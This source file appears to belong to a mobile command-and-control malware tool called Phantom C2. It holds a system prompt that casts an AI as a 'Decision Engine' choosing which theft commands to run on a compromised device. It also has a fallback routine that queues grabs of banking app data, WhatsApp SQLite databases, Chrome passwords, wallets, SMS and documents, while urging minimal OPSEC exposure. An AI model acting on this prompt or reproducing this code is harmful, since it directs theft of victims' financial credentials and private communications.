import { aiContext } from './context.js'
import { callAIWithFallback, parseAIResponse } from './swarm.js'

const DECIDER_SYSTEM_PROMPT = `You are the Decision Engine for Phantom C2.

Your job: Given current device intelligence and analysis, decide the optimal next command(s) to execute.

Available commands: !target, !contacts, !sms, !call_log, !location, !installed, !battery, !grabber (all/browser/messenger/wallets/files/clipboard/banks/whatsapp/chrome/docs), !shell, !dir, !tree, !find, !cat, !download, !disk, !recent

RULES:
- Prioritize high-value data first (banking, WhatsApp, passwords)
- Don't gather data you already have
- Minimize OPSEC exposure — avoid unnecessary commands
- After banking app detected, grab files from that app's data dir
- After WhatsApp detected, grab full SQLite extraction
- If root is available, prefer deep scans

OUTPUT FORMAT (strict JSON, no markdown):
{
  "analysis": "Brief reasoning for the decision",
  "commands": [
    {"command": "!command", "args": "args", "reason": "Why this command"}
  ],
  "priority": 1,
  "blocking": false,
  "stop": false
}

Set stop:true if no further action needed (all high-value data collected).`

export async function decideNextActions(analysis, session) {
  try {
    const ctx = aiContext.summarizeDeviceKnowledge(session)
    const input = `Current knowledge:\n${ctx || 'Nothing known yet'}\n\nAnalysis:\n${JSON.stringify(analysis, null, 2)}\n\nDecide next action.`
    const result = await callAIWithFallback(DECIDER_SYSTEM_PROMPT, [
      { role: 'user', content: input },
    ], { complexity: 'high' })
    return parseAIResponse(result.result)
  } catch {
    return {
      analysis: 'Could not decide with AI. Using rule-based fallback.',
      commands: fallbackDecide(analysis),
      priority: 99,
      blocking: false,
      stop: false,
    }
  }
}

function fallbackDecide(analysis) {
  const cmds = []
  const findings = analysis?.highValueFindings || []
  const types = findings.map(f => f.type)

  if (!types.includes('bank') && !types.includes('whatsapp')) {
    cmds.push({ command: '!grabber', args: 'banks', reason: 'Scan for banking apps' })
    cmds.push({ command: '!grabber', args: 'whatsapp', reason: 'Extract WhatsApp data' })
  }
  if (types.includes('bank')) {
    cmds.push({ command: '!grabber', args: 'banks', reason: 'Deep extract banking app data' })
  }
  if (types.includes('whatsapp')) {
    cmds.push({ command: '!grabber', args: 'whatsapp', reason: 'Full WhatsApp SQLite + media extraction' })
  }
  if (!types.includes('password')) {
    cmds.push({ command: '!grabber', args: 'chrome', reason: 'Extract Chrome passwords & history' })
  }
  cmds.push({ command: '!grabber', args: 'docs', reason: 'Gather PDF, DOCX, XLSX documents' })

  return cmds.slice(0, 4)
}
